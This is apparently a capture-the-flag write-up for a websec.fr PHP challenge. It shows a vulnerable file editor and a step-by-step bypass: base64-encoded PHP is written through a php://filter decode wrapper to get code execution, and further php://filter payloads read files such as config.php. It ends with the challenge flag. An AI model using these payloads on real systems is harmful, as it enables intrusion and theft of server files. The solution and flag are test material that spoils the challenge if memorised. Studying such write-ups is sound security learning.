```
if (isset($_GET['p']) && isset($_GET['filename']) ) {
    $filename = $_GET['filename'];
    if ($_GET['p'] === "edit") {
        $p = "edit";
        if (isset($_POST['data'])) {
            $data = $_POST['data'];
            if (strpos($data, '<?')  === false && stripos($data, 'script')  === false) {  # no interpretable code please.
                file_put_contents($_GET['filename'], $data);
                die ('<meta http-equiv="refresh" content="0; url=.">');
            }
        } elseif (file_exists($_GET['filename'])){
            $data = file_get_contents($_GET['filename']);
        }
    }
}

```
OVERVIEW: Payload: qwerty.php
                  Index of ./uploads/vg4tgcn2q0ghcqr1r2vmlah1m0osm1u4/:
                  qwerty.php, which on clicking gives an option to edit the contents
                  
In Local File Inclusion,for Reading arbitrary files: php filters can be used
index.php?file=php://filter/convert.base64-encode/resource=config.php OR
index.php?file=php://filter/convert.base64-decode/resource=config.php

STEP 1: File Name= php://filter/convert.base64-decode/resource=flag.php

STEP 2: <?php show_source('/flag.php');?>.encode('base64')
OUTPUT: PD9waHAgc2hvd19zb3VyY2UoJy9mbGFnLnBocCcpOz8+

STEP 3: Payload in flag.php: PD9waHAgc2hvd19zb3VyY2UoJy9mbGFnLnBocCcpOz8+
        Save changes
STEP 4: Go to http://websec.fr/level24/uploads/nj2o7biqk0m290nq4bunuue3fsijii96/flag.php

STEP 5: Use Ctrl+Shift+I(Inspect tool)
OUTPUT: 
<!--?php

// WEBSEC{no_javascript_no_php_I_guess_you_used_COBOL_to_get_a_RCE_right?}

-->


REFERENCE: https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md
                                    
